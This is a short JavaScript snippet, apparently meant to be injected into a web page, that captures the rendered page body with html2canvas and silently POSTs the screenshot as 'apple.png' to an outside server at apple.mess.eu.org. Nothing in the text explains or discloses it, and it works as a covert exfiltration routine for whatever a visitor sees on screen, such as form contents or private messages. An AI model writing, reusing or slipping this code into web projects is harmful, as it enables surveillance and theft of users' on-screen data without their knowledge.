function apple() {
    html2canvas(document.body).then(canvas => {
        canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append('photo', blob, 'apple.png');
            fetch('https://apple.mess.eu.org/', {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Failed :(');
                }
                console.log('Good :)');
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }, 'image/png');
    });
}
